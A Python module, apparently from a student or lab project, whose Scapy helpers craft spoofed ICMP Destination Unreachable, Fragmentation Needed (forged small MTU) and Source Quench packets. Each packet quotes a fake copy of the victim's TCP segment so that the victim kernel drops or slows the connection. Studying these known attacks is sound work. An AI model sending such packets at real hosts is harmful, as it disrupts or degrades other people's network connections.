"""
packet_utils.py  —  Helpers to build the spoofed ICMP packets.
Owner: ANISA (foundation — Attack 1 and Attack 2 both call these)

The design report (§3.1) shows every spoofed ICMP packet has the SAME shape:

    IP(src = spoofed) / ICMP(type,code, extra) / <the "offending" IP+TCP header>

The trick of a blind ICMP attack is the EMBEDDED packet: we quote a fake copy
of the victim's own TCP segment so the victim's kernel thinks "this error is
about my connection" and reacts. We never see the real traffic — we guess the
4-tuple (§Phase 3).

We use Scapy so the crafting stays readable. Keep the bodies short: each
function returns ONE ready-to-send Scapy packet.
"""

from scapy.all import IP, TCP, ICMP
from common import config


def embedded_segment(client_ip, server_ip, client_port, server_port, seq):
    """
    Build the 'offending packet' that gets quoted inside the ICMP error.
    This is a fake copy of a Client->Server TCP segment (§3.1 bottom box).

    Returns an IP()/TCP() layer (NOT sent on its own — it rides inside ICMP).
    """
    # NOTE direction: the quoted packet is the victim's OUTGOING segment,
    # so src=client, dst=server. seq must look in-window for Attack 1 (§3.2).
    return IP(src=client_ip, dst=server_ip, proto=6) / \
           TCP(sport=client_port, dport=server_port, seq=seq)


def build_dest_unreachable(client_port, seq=config.GUESSED_SEQ, code=3):
    """
    ATTACK 1 packet — ICMP Destination Unreachable (Type 3).
    code 2 = Protocol Unreachable, code 3 = Port Unreachable (§3.2).
    Spoofed source = the Server, so it looks like the peer rejected us.

    TODO(Anisa): wrap this in the port/seq brute-force loop (infer_tuple.py).
    """
    return IP(src=config.IP_SERVER, dst=config.IP_CLIENT) / \
           ICMP(type=3, code=code) / \
           embedded_segment(config.IP_CLIENT, config.IP_SERVER,
                            client_port, config.SERVER_PORT, seq)


def build_frag_needed(client_port, mtu=config.SPOOFED_MTU):
    """
    ATTACK 2a packet — ICMP Fragmentation Needed (Type 3, Code 4).
    Carries a forged Next-Hop MTU; spoofed source = the Router (§3.3).
    A tiny MTU makes the Client shrink its PMTU and lose throughput.

    In Scapy the Next-Hop MTU goes in the ICMP 'nexthopmtu' field.
    """
    return IP(src=config.IP_ROUTER, dst=config.IP_CLIENT) / \
           ICMP(type=3, code=4, nexthopmtu=mtu) / \
           embedded_segment(config.IP_CLIENT, config.IP_SERVER,
                            client_port, config.SERVER_PORT, seq=0)


def build_source_quench(client_port):
    """
    ATTACK 2b packet — ICMP Source Quench (Type 4, Code 0).
    Secondary vector: modern Linux IGNORES this since 2004 (§1), so treat a
    null result as an expected finding, not a bug. Spoofed source = Server.
    """
    return IP(src=config.IP_SERVER, dst=config.IP_CLIENT) / \
           ICMP(type=4, code=0) / \
           embedded_segment(config.IP_CLIENT, config.IP_SERVER,
                            client_port, config.SERVER_PORT, seq=0)
